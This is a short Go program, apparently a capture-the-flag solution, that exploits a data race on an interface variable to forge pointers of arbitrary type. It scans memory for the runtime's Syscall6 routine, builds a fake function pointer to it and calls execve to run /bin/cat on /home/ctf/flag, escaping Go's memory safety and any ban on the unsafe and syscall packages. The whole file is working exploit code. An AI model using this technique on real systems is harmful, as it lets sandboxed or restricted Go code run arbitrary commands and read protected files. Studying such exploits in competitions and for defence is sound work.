package main

func typeConfuse[OutputType, InputType any](input *InputType) (output *OutputType) {
	var intf any
	stop := false
	go func() {
		for !stop {
			intf = any(input)
			intf = any(output)
		}
	}()
	for {
		if ptr, ok := intf.(*OutputType); ok && ptr != nil {
			stop = true
			return ptr
		}
	}
}

var dummy uintptr

func main() {
	println()

	pdata := &dummy
	paddr := typeConfuse[uintptr](&pdata)
	*paddr &^= 0xF
	for *pdata != 0x7C8B480824448B48 {
		*paddr -= 0x10
	}
	println("runtime/internal/syscall.Syscall6 @", pdata)

	var ppfunc func(_0,_1,_2,_3,_4,_5,_6,_7,_8 uintptr, syscall_nr uintptr, filename *byte, argv **byte, envp **byte)
	*typeConfuse[*uintptr](&ppfunc) = paddr
	const NR_EXECVE = 59
	filename := []byte("/bin/cat\000")
	argv := [](*byte){&filename[0], &[]byte("/home/ctf/flag")[0], nil}
	ppfunc(0, 1, 2, 3, 4, 5, 6, 7, 8, NR_EXECVE, &filename[0], &argv[0], nil)
}
